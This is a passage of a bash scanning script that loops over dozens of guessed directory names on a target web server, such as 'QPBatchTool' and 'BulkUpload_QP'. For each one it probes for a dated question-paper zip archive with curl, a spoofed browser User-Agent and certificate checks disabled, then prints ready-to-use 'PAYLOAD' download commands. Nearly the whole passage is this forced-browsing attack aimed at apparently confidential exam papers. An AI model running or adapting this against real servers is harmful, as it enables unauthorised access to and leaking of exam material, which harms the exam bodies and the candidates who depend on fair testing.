${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
